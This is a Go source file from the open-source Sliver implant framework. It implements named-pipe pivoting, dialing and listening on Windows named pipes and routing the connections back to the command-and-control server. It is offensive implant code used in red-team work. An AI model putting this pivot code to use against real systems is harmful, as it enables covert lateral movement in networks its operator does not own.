package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"io"
	"net"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
)

// DialNamedPipe - A connection coming from the server, that needs to be routed via a Named Pipe
func DialNamedPipe(handler *sliverpb.Handler, src io.ReadWriteCloser) error {
	pipeName := handler.RHost

	// {{if .Config.Debug}}
	log.Printf("Dialing Named Pipe on %s", handler.RHost)
	// {{end}}

	// Get a conn and pipe -->
	dst, err := winio.DialPipe("\\\\.\\pipe\\"+pipeName, defaultNetTimeout)
	if err != nil {
		// We should return an error to the server.
		return err
	}
	transport(src, dst)
	return nil
}

// ListenNamedPipe - The implant is requested to start a Named Pipe reverse handler and return the
// connection to the server, with the handler information passed in. This connection can be wrapped
func ListenNamedPipe(handler *sliverpb.Handler) (ln net.Listener, err error) {
	pipeName := handler.LHost

	// {{if .Config.Debug}}
	log.Printf("Starting Windows Named Pipe listener on %s", pipeName)
	// {{end}}

	ln, err = winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
	// {{if .Config.Debug}}
	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
	// {{end}}
	if err != nil {
		return nil, err
	}

	// Create abstracted listener
	listener := newListener(handler, ln)
	listener.info.Application = sliverpb.ApplicationProtocol_NamedPipe

	// Add listener to jobs
	Listeners.Add(listener)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				// We should return an error to the server.

				// If err is closed listener, return
				continue
			}

			// For each connection, route back to the server.
			go Comms.server.handleReverse(handler, conn)
		}
	}()

	return
}
